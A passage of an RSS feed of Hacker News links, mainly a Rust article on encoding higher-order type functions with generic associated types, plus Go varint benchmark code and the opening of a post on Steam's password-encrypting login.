10 bytes.  Taking a random uint64 wouldn't give me a good distribution so I create the data like so:</p>
<div data-language="go"><pre><code><span>func</span> <span>initToDecode</span><span>(</span>b <span>*</span>testing<span>.</span>B<span>,</span> numItems <span>int</span><span>)</span> <span>[</span><span>]</span>ve <span>{</span>
	toDecode <span>:=</span> <span>make</span><span>(</span><span>[</span><span>]</span>ve<span>,</span> b<span>.</span>N<span>*</span>numItems<span>)</span>

	r <span>:=</span> rand<span>.</span><span>New</span><span>(</span>rand<span>.</span><span>NewSource</span><span>(</span><span>0</span><span>)</span><span>)</span>
	<span>for</span> i <span>:=</span> <span>0</span><span>;</span> i <span>&lt;</span> b<span>.</span>N<span>*</span>numItems<span>;</span> i<span>++</span> <span>{</span>
		desiredSize <span>:=</span> <span>(</span>i <span>%</span> <span>10</span><span>)</span> <span>+</span> <span>1</span>
		min <span>:=</span> <span>uint64</span><span>(</span><span>0</span><span>)</span>
		max <span>:=</span> <span>uint64</span><span>(</span><span>0x80</span><span>)</span>

		<span>if</span> desiredSize <span>&lt;</span> <span>10</span> <span>{</span>
			<span>for</span> j <span>:=</span> <span>0</span><span>;</span> j <span>&lt;</span> desiredSize<span>-</span><span>1</span><span>;</span> j<span>++</span> <span>{</span>
				min <span>=</span> max
				max <span>&lt;&lt;=</span> <span>7</span>
			<span>}</span>
		<span>}</span> <span>else</span> <span>{</span>
			min <span>=</span> <span>0x8000000000000000</span>
			max <span>=</span> <span>0xffffffffffffffff</span>
		<span>}</span>

		val <span>:=</span> min <span>+</span> <span>(</span>r<span>.</span><span>Uint64</span><span>(</span><span>)</span> <span>%</span> <span>(</span>max <span>-</span> min<span>)</span><span>)</span>
		buf <span>:=</span> <span>make</span><span>(</span><span>[</span><span>]</span><span>byte</span><span>,</span> <span>10</span><span>)</span>
		size <span>:=</span> binary<span>.</span><span>PutUvarint</span><span>(</span>buf<span>,</span> val<span>)</span>
		require<span>.</span><span>Equal</span><span>(</span>b<span>,</span> desiredSize<span>,</span> size<span>,</span> <span>"%d. min: %x, val: %x, expected_size: %d, size: %d"</span><span>,</span> i<span>,</span> min<span>,</span> val<span>,</span> desiredSize<span>,</span> size<span>)</span>

		toDecode<span>[</span>i<span>]</span> <span>=</span> ve<span>{</span>val<span>,</span> buf<span>}</span>
	<span>}</span>

	<span>return</span> toDecode
<span>}</span></code></pre></div>
<p>This function will generate an array of test data where the nth element is decoded from (n%10) + 1 bytes. After
generating a number that is in the correct value range <code>bytes.PutUvarint</code> is used to encode it and it's encoded size is
validated against what we expected.</p>

<p>Finally our benchmark calls the initialization code and allocates storage for the results before kicking off the individual
decoding implementation benchmarks. After all the benchmarks run the results are validated.</p>
<div data-language="go"><pre><code><span>func</span> <span>BenchmarkUnrolledDecode…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dolthub.com/blog/2021-01-08-optimizing-varint-decoding/">https://www.dolthub.com/blog/2021-01-08-optimizing-varint-decoding/</a></em></p>]]>
            </description>
            <link>https://www.dolthub.com/blog/2021-01-08-optimizing-varint-decoding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25691701</guid>
            <pubDate>Fri, 08 Jan 2021 23:07:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Semantic Web, Syllogism, and Worldview (2003)]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25691623">thread link</a>) | @cratermoon
<br/>
January 8, 2021 | https://www.karmak.org/archive/2004/06/semantic_syllogism.html | <a href="https://web.archive.org/web/*/https://www.karmak.org/archive/2004/06/semantic_syllogism.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.karmak.org/archive/2004/06/semantic_syllogism.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25691623</guid>
            <pubDate>Fri, 08 Jan 2021 22:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generic associated types encode higher-order functions on types in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25691494">thread link</a>) | @fanf2
<br/>
January 8, 2021 | https://willcrichton.net/notes/gats-are-hofs/ | <a href="https://web.archive.org/web/*/https://willcrichton.net/notes/gats-are-hofs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  <p>
    
    Will Crichton
    
    &nbsp; — &nbsp;
    January 4, 2021
  </p>
  <p>GATs allow type parameters to associated types in traits. This feature enables total type-level functions to be associated to structs. I show how to use this pattern to implement higher-order type-level functions, and how to use specialization to make partial functions into total functions.</p>
  <p><em>Part of an ongoing series about type-level programming in Rust. Read <a href="http://willcrichton.net/notes/type-level-programming/">part one</a> first!<br></em></p>

<p>With <a href="https://github.com/rust-lang/rfcs/blob/master/text/1598-generic_associated_types.md">generic associated types</a> landing recently in Rust nightly, I’ve been wondering: what expressive power does this feature add to type-level programming? The answer is <strong>higher-order functions on types</strong>, and in this post I’ll explain what that means and how it works.</p>

<h2 id="a-refresher-on-type-level-programming">A refresher on type-level programming</h2>

<p>Using a pure functional programming style, we can define objects like a list of types. For example, using <a href="https://github.com/willcrichton/tyrade">tyrade</a>, my type-level programming language:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>enum</span> <span>TList</span> <span>{</span>
    <span>TNil</span><span>,</span>
    <span>TCons</span><span>(</span><span>Type</span><span>,</span> <span>TList</span><span>)</span>
  <span>}</span>

  <span>enum</span> <span>TOption</span> <span>{</span>
    <span>TNone</span><span>,</span>
    <span>TSome</span><span>(</span><span>Type</span><span>)</span>
  <span>}</span>

  <span>// Get the Nth item from the list, where Index is either Z or S&lt;N&gt;</span>
  <span>fn</span> <span>Nth</span><span>&lt;</span><span>List</span><span>,</span> <span>Index</span><span>&gt;</span><span>()</span> <span>{</span>
    <span>match</span> <span>List</span> <span>{</span>
      <span>TNil</span> <span>=&gt;</span> <span>TNone</span><span>,</span>
      <span>TCons</span><span>(</span><span>X</span><span>,</span> <span>XS</span><span>)</span> <span>=&gt;</span> <span>match</span> <span>Index</span> <span>{</span>
        <span>Z</span> <span>=&gt;</span> <span>TSome</span><span>(</span><span>X</span><span>),</span>
        <span>S</span><span>(</span><span>IMinusOne</span><span>)</span> <span>=&gt;</span> <span>Nth</span><span>(</span><span>XS</span><span>,</span> <span>IMinusOne</span><span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>// checks that Nth([i32, f32], 1) == Some(f32)</span>
  <span>assert_type_eq</span><span>::</span><span>&lt;</span>
    <span>Nth</span><span>&lt;</span><span>TCons</span><span>&lt;</span><span>i32</span><span>,</span> <span>TCons</span><span>&lt;</span><span>f32</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span><span>,</span> <span>S</span><span>&lt;</span><span>Z</span><span>&gt;&gt;</span><span>,</span>
    <span>TSome</span><span>&lt;</span><span>f32</span><span>&gt;</span>
  <span>&gt;</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>The <code>tyrade!</code> procedural macro compiles the pseudo-Rust notation into a series of structs, traits, and impls. For example:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>TNil</span><span>;</span>
<span>pub</span> <span>struct</span> <span>TCons</span><span>&lt;</span><span>T0</span><span>,</span> <span>T1</span><span>&gt;</span><span>(</span><span>...</span><span>);</span>

<span>pub</span> <span>trait</span> <span>ComputeNth</span><span>&lt;</span><span>Index</span><span>&gt;</span> <span>{</span>
    <span>type</span> <span>Output</span><span>;</span>
<span>}</span>
<span>pub</span> <span>type</span> <span>Nth</span><span>&lt;</span><span>List</span><span>,</span> <span>Index</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>List</span> <span>as</span> <span>ComputeNth</span><span>&lt;</span><span>Index</span><span>&gt;&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span><span>&lt;</span><span>Index</span><span>&gt;</span> <span>ComputeNth</span><span>&lt;</span><span>Index</span><span>&gt;</span> <span>for</span> <span>TNil</span> <span>{</span>
    <span>type</span> <span>Output</span> <span>=</span> <span>TNone</span><span>;</span>
<span>}</span>
<span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span> <span>ComputeNth</span><span>&lt;</span><span>Z</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span> <span>X</span><span>:</span> <span>ComputeTSome</span> <span>{</span>
    <span>type</span> <span>Output</span> <span>=</span> <span>TSome</span><span>&lt;</span><span>X</span><span>&gt;</span><span>;</span>
<span>}</span>
<span>impl</span><span>&lt;</span><span>IMinusOne</span><span>,</span> <span>X</span><span>,</span> <span>XS</span><span>&gt;</span> <span>ComputeNth</span><span>&lt;</span><span>S</span><span>&lt;</span><span>IMinusOne</span><span>&gt;&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span> <span>XS</span><span>:</span> <span>ComputeNth</span><span>&lt;</span><span>IMinusOne</span><span>&gt;</span> <span>{</span>
    <span>type</span> <span>Output</span> <span>=</span> <span>Nth</span><span>&lt;</span><span>XS</span><span>,</span> <span>IMinusOne</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<blockquote>
  <p>See my explainer on <a href="https://willcrichton.net/notes/type-level-programming/">type-level programming</a> if you are confused about the correspondence between these programs.</p>
</blockquote>

<h2 id="higher-order-functions-on-types">Higher-order functions on types</h2>

<p>For me, Tyrade is a explicit representation of my mental model for type-level programming. Once I conceptually understood the correspondences between type-level enums and structs, or between type-level functions and traits, then I reified that understanding into the Tyrade compiler.</p>

<p>However, trait/function correspondence only worked when the arguments to type-level functions were types. To explain, we’ll use the running example of a list map function. The goal is to write it in Tyrade like this:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>Map</span><span>&lt;</span><span>List</span><span>,</span> <span>Func</span><span>&gt;</span><span>()</span> <span>{</span>
    <span>match</span> <span>List</span> <span>{</span>
      <span>TNil</span> <span>=&gt;</span> <span>TNil</span><span>,</span>
      <span>TCons</span><span>(</span><span>X</span><span>,</span> <span>XS</span><span>)</span> <span>=&gt;</span> <span>TCons</span><span>(</span><span>Func</span><span>(</span><span>X</span><span>),</span> <span>Map</span><span>(</span><span>XS</span><span>,</span> <span>Func</span><span>))</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Then we could use the <code>Map</code> type function like this:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>TIsZero</span><span>&lt;</span><span>N</span><span>&gt;</span><span>()</span> <span>{</span>
    <span>match</span> <span>N</span> <span>{</span>
      <span>Z</span> <span>=&gt;</span> <span>TTrue</span><span>,</span>
      <span>S</span><span>(</span><span>N1</span><span>)</span> <span>=&gt;</span> <span>TFalse</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>assert_type_eq</span><span>::</span><span>&lt;</span>
    <span>Map</span><span>&lt;</span>
      <span>TCons</span><span>&lt;</span><span>Z</span><span>,</span> <span>TCons</span><span>&lt;</span><span>S</span><span>&lt;</span><span>Z</span><span>&gt;</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span><span>,</span>
      <span>TIsZero</span>
    <span>&gt;</span><span>,</span>
    <span>TCons</span><span>&lt;</span><span>TTrue</span><span>,</span> <span>TCons</span><span>&lt;</span><span>TFalse</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span>
  <span>&gt;</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>However, the existing translation of <code>Map</code> doesn’t work. It would become:</p>

<div><div><pre><code><span>pub</span> <span>trait</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>{</span>
  <span>type</span> <span>Output</span><span>;</span>
<span>}</span>
<span>pub</span> <span>type</span> <span>Map</span><span>&lt;</span><span>List</span><span>,</span> <span>Func</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>List</span> <span>as</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>for</span> <span>TNil</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TNil</span><span>;</span>
<span>}</span>
<span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>,</span> <span>Func</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span> <span>XS</span><span>:</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TCons</span><span>&lt;</span><span>Func</span><span>&lt;</span><span>X</span><span>&gt;</span><span>,</span> <span>Map</span><span>&lt;</span><span>XS</span><span>,</span> <span>Func</span><span>&gt;&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>And this code fails to compile because <code>Func</code> can’t be invoked with a parameter:</p>

<div><div><pre><code>error[E0109]: type arguments are not allowed for this type
    |
    |     type Output = TCons&lt;Func&lt;X&gt;, Map&lt;XS, Func&gt;&gt;;
    |                              ^ type argument not allowed
</code></pre></div></div>

<p>Herein lies the crux of the issue: type variables (i.e. impl quantifiers) are only allowed to be of kind <code>type</code>, and not of kind <code>type -&gt; type</code>. To get higher-order type functions, we need Rust to support higher-kinded types (HKT). While Rust doesn’t support HKT directly, the addition of generic associated types (GATs) enables a pseudo-HKT pattern. See <a href="http://smallcultfollowing.com/babysteps/blog/2016/11/03/associated-type-constructors-part-2-family-traits/">Niko’s extended discussion</a> for the gory details.</p>

<h2 id="implementing-hofs-with-hkts-with-gats">Implementing HOFs with HKTs with GATs</h2>

<p><code>TIsZero</code> cannot be passed directly into <code>ComputeMap</code>, so the key idea is to create a proxy object <code>TIsZeroProxy</code> which can be passed in. Using GATs, we associate the <code>TIsZeroProxy</code> back to <code>TIsZero</code> in a way that can be referenced within <code>ComputeMap</code>. First, the proxy:</p>

<div><div><pre><code><span>pub</span> <span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>pub</span> <span>struct</span> <span>TIsZeroProxy</span><span>;</span>
<span>impl</span> <span>FuncProxy</span> <span>for</span> <span>TIsZeroProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>TIsZero</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Then the implementation of <code>ComputeMap</code> can be parameterized by any type implementing <code>FuncProxy</code>:</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>,</span> <span>Proxy</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span>
  <span>Proxy</span><span>:</span> <span>FuncProxy</span><span>,</span>
  <span>XS</span><span>:</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span>
<span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TCons</span><span>&lt;</span><span>Proxy</span><span>::</span><span>Func</span><span>&lt;</span><span>X</span><span>&gt;</span><span>,</span> <span>Map</span><span>&lt;</span><span>XS</span><span>,</span> <span>Proxy</span><span>&gt;&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>However, this attempt still doesn’t quite work. We get an error in the implementation of <code>FuncProxy</code> for <code>TIsZeroProxy</code>:</p>

<div><div><pre><code>error[E0277]: the trait bound `T: ComputeTIsZero` is not satisfied
    |
    |   type Func&lt;T&gt; = TIsZero&lt;T&gt;;
    |   ^^^^^^^^^^^^^^^^^^^^^^^^ the trait `ComputeTIsZero` is not implemented for `T`
    |
</code></pre></div></div>

<p>Why do we get this? Recall that <code>TIsZero&lt;T&gt;</code> is an alias for <code>&lt;T as ComputeTIsZero&gt;::Output</code>. This means that <code>T</code> must implement the <code>ComputeTIsZero</code> trait, which isn’t guaranteed by our general <code>FuncProxy</code> trait definition. We could theoretically change <code>FuncProxy</code> to include this bound, something like:</p>

<div><div><pre><code><span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>:</span> <span>ComputeTIsZero</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>However, our goal is for <code>Map</code> to take as input any type-level function. This definition of <code>FuncProxy</code> would restrict the implement to only functions mentioned in the trait bounds.</p>

<h2 id="dealing-with-partial-functions">Dealing with partial functions</h2>

<p>Let’s back up to understand the conceptual issue. In Rust, type-level functions are partial functions, meaning they may not be implemented for all types. For example, <code>TIsZero</code> is only implemented for the types <code>Z</code> and <code>S&lt;N&gt;</code>, but not e.g. for the type <code>String</code>. However, to define <code>Map</code>, we have to ensure that <code>Proxy::Func&lt;X&gt;</code> is defined for all <code>X</code> in a type list.</p>

<p>Previously, we could ensure this condition via a trait bound. For example, if <code>Proxy::Func</code> was <code>ComputeTIsZero</code>, then we could add <code>X: ComputeTIsZero</code> to the implementation. But for any generic <code>Proxy::Func</code>, there is no way to say <code>X: Proxy::Func</code> because <code>Proxy::Func</code> is a type, not a trait. Hypothetically, if Rust supported <a href="https://github.com/rust-lang/rfcs/issues/2190">associated traits</a>, we could do something like:</p>

<div><div><pre><code><span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>trait</span> <span>Func</span> <span>{</span> <span>type</span> <span>Output</span><span>;</span> <span>};</span>
<span>}</span>

<span>impl</span> <span>FuncProxy</span> <span>for</span> <span>TIsZeroProxy</span> <span>{</span>
  <span>trait</span> <span>Func</span> <span>=</span> <span>ComputeTIsZero</span><span>;</span>
<span>}</span>

<span>type</span> <span>CallProxy</span><span>&lt;</span><span>Proxy</span><span>,</span> <span>T</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>Proxy</span><span>::</span><span>Func</span><span>&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>,</span> <span>Proxy</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span>
  <span>Proxy</span><span>:</span> <span>FuncProxy</span><span>,</span>
  <span>XS</span><span>:</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span><span>,</span>
  <span>X</span><span>:</span> <span>Proxy</span><span>::</span><span>Func</span>
<span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TCons</span><span>&lt;</span><span>CallProxy</span><span>&lt;</span><span>Proxy</span><span>,</span> <span>X</span><span>&gt;</span><span>,</span> <span>Map</span><span>&lt;</span><span>XS</span><span>,</span> <span>Proxy</span><span>&gt;&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>However, Rust doesn’t have such a feature. Instead, we can use <a href="https://github.com/rust-lang/rust/issues/31844">specialization</a> to make all type functions total. We can define a base case where a type function returns an error if it’s not implemented, but as a type rather than a compiler error. To compile <code>TIsZero</code>, this solution looks like:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>Error</span><span>;</span>

<span>pub</span> <span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>pub</span> <span>trait</span> <span>ComputeTIsZero</span> <span>{</span>
  <span>type</span> <span>Output</span><span>;</span>
<span>}</span>

<span>type</span> <span>TIsZero</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>ComputeTIsZero</span><span>&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span> <span>ComputeTIsZero</span> <span>for</span> <span>Z</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TTrue</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>N</span><span>&gt;</span> <span>ComputeTIsZero</span> <span>for</span> <span>S</span><span>&lt;</span><span>N</span><span>&gt;</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TFalse</span><span>;</span>
<span>}</span>

<span>/* key addition */</span>
<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>ComputeTIsZero</span> <span>for</span> <span>T</span> <span>{</span>
  <span>default</span> <span>type</span> <span>Output</span> <span>=</span> <span>Error</span><span>;</span>
<span>}</span>

<span>struct</span> <span>TIsZeroProxy</span><span>;</span>
<span>impl</span> <span>FuncProxy</span> <span>for</span> <span>TIsZeroProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>TIsZero</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>With this addition, the <code>TIsZeroProxy</code> implementation no longer errors, because <code>ComputeTIsZero</code> is guaranteed to be implemented for all types <code>T</code>. And now, at long last, our <code>Map</code> program will execute correctly if we replace <code>TIsZero</code> with <code>TIsZeroProxy</code>:</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>assert_type_eq</span><span>::</span><span>&lt;</span>
    <span>Map</span><span>&lt;</span>
      <span>TCons</span><span>&lt;</span><span>Z</span><span>,</span> <span>TCons</span><span>&lt;</span><span>S</span><span>&lt;</span><span>Z</span><span>&gt;</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span><span>,</span>
      <span>TIsZeroProxy</span>
    <span>&gt;</span><span>,</span>
    <span>TCons</span><span>&lt;</span><span>TTrue</span><span>,</span> <span>TCons</span><span>&lt;</span><span>TFalse</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span>
  <span>&gt;</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<blockquote>
  <p>Note: as of January 2021, this pattern is theoretically sound, but seems to have ongoing performance or correctness issues in the compiler. Specialization combined with recursive trait bounds will occassionally cause the compiler to stack overflow  — see my <a href="https://github.com/rust-lang/rust/issues/80700">Github issue</a>.</p>
</blockquote>

<h2 id="dynamically-kinded-type-level-programming">Dynamically-kinded type-level programming</h2>

<p>To add support for higher-order type functions, I had to remove support for type annotations (actually kind annotations) from Tyrade. Previously, you could write functions like this:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>TIsZero</span><span>(</span><span>N</span><span>:</span> <span>TNum</span><span>)</span> <span>-&gt;</span> <span>TBool</span> <span>{</span>
    <span>match</span> <span>N</span> <span>{</span>
      <span>Z</span> <span>=&gt;</span> <span>TTrue</span><span>,</span>
      <span>S</span><span>(</span><span>N1</span> <span>@</span> <span>TNum</span><span>)</span> <span>=&gt;</span> <span>TFalse</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This program would compile into the trait definition:</p>

<div><div><pre><code><span>trait</span> <span>ComputeTIsZero</span><span>:</span> <span>TNum</span> <span>{</span>
  <span>type</span> <span>Output</span><span>:</span> <span>TBool</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This ensures, for example, that a function’s return value matches its return kind. If you wrote a function with a mismatch:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>TIsZero</span><span>(</span><span>N</span><span>:</span> <span>TNum</span><span>)</span> <span>-&gt;</span> <span>TBool</span> <span>{</span>
    <span>Z</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Then the compiler raises an error at the point of <em>definition</em> for <code>TIsZero</code> rather than the point of <em>use</em>. Hence, this language is statically-kinded. However, to kind-check a higher-order function like <code>Map</code>, we need a polymorphic kind system. Ideally, we could write in Tyrade:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>Map</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>(</span><span>L</span><span>:</span> <span>List</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>F</span><span>:</span> <span>A</span> <span>-&gt;</span> <span>B</span><span>)</span> <span>-&gt;</span> <span>List</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>...</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>I don’t believe it’s possible to encode this concept into Rust’s trait system. So to add higher-order functions, our type-level programming language had to become dynamically-kinded. A sad trade-off, but perhaps more acceptable for type-level programming than value-level. Although errors are caught by the users and not the definers, at least they’re still caught at compile-time!</p>

</div></div>]]>
            </description>
            <link>https://willcrichton.net/notes/gats-are-hofs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25691494</guid>
            <pubDate>Fri, 08 Jan 2021 22:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Predictive Modeling: A Retrospective]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25691239">thread link</a>) | @gthinkin
<br/>
January 8, 2021 | https://www.shreya-shankar.com/predictive-modeling-retrospective/ | <a href="https://web.archive.org/web/*/https://www.shreya-shankar.com/predictive-modeling-retrospective/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><header><h3><a href="https://www.shreya-shankar.com/">Shreya Shankar</a></h3></header><main><p>January 08, 2021<!-- --> in <a href="https://www.shreya-shankar.com/tags/machine-learning/">#<!-- -->machine learning</a> · <!-- -->1 min read</p><p>You can read the essay <a href="https://www.shreya-shankar.com/8d5c6ec070babe7c23d3d5b68384a8bd/retrospective.pdf">here</a>. Please note that it is not a 1 minute read.</p><hr><div><p><strong><a href="https://twitter.com/sh_reya">Shreya Shankar</a></strong> likes systems and machine learning.</p></div><ul><li><a rel="prev" href="https://www.shreya-shankar.com/2020-bookshelf/">← <!-- -->2020 Bookshelf</a></li><li></li></ul></main></div></div></div></div>]]>
            </description>
            <link>https://www.shreya-shankar.com/predictive-modeling-retrospective/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25691239</guid>
            <pubDate>Fri, 08 Jan 2021 22:15:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Steams login method is kinda interesting]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690995">thread link</a>) | @sroussey
<br/>
January 8, 2021 | https://owlspace.xyz/cybersec/steam-login/ | <a href="https://web.archive.org/web/*/https://owlspace.xyz/cybersec/steam-login/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><header></header><p>How do you send a password over the internet? You acquire a SSL certificate and let TLS do the job of securely transporting the password from client to server. Of course it’s not as cut-and-dry as I’m making it out to be, but the gist of it holds true and stood the test of time. This hasn’t always been this way though, and one incredibly popular storefront on the world wide web prefers to add a little extra to this day. I’ll be discussing Steam’s unique method of logging in their users, and go down a deep rabbit hole of fascinating implementation details.</p><h3 id="pointing-out-the-obvious">Pointing out the obvious</h3><p>I found a StackOverflow question from 2013 <a href="https://stackoverflow.com/questions/1582894/how-to-send-password-securely-over-http">asking how to securely send a password over HTTP</a>. The answers are pretty unanimous: get a SSL certificate. Here’s an experiment: set up your favorite traffic-capturing proxy, browse to a service you frequently use, log in with your account (or preferably a throwaway), and inspect the requests. You will most certainly find that your username and password are sent as-is in a HTTP request body. The only reason this works is because your connection to the server is encrypted using TLS.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/so-real-host.png" alt="StackOverflow user asking what to do if a webhost doesn't support SSL certificates, told to move to a real webhost"><figcaption><p>Weird to think that this used to be an issue</p></figcaption></figure><p>The internet was a different place though in the early 2010s, let alone the many years prior. We now have services like <a href="https://letsencrypt.org/">Let’s Encrypt</a> which issue SSL certificates free of charge for a period of three months, with automatic renewals if desired. There really wasn’t much of a way around acquiring a SSL certificate for money, but usually with extended validity and support. You could certainly argue that there is a price to be paid for the security and privacy of your users, but that didn’t stop questions like the one I linked from appearing.</p><p>Now that we all agree that TLS is important, let’s switch it up. Let’s pretend we cannot send a password over HTTPS and have to somehow make it work with plain HTTP, while also providing users with some level of security. There’s the <code>Authorization</code> header which is standardized and widely accepted. However, in conjunction with the “Basic” HTTP Authentication scheme, it provides no security if used in plain HTTP.</p><p>There are tried and tested challenge-response algorithms, most notably <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">SRP</a> which is designed to do password-based authentication without ever actually sending the password, but you probably have to implement them yourself and a slight oversight could cause serious harm. You could also defer authentication to an external service. “Sign in with service XYZ” is commonly used, but comes with its own ramifications. All things considered, it’s not trivial to send secrets over an inheretly insecure connection.</p><p>So when me and a friend took Steam apart in search for traces of personally identifiable information, I was surprised to see that Steam’s login page doesn’t only rely on TLS to ensure that your password stays protected.</p><h3 id="crypto-cherry-on-top">Crypto cherry on top</h3><p>Again, grab your favorite traffic-capturing proxy and navigate to <a href="https://store.steampowered.com/login">Steam’s login page</a>. Enter your username and 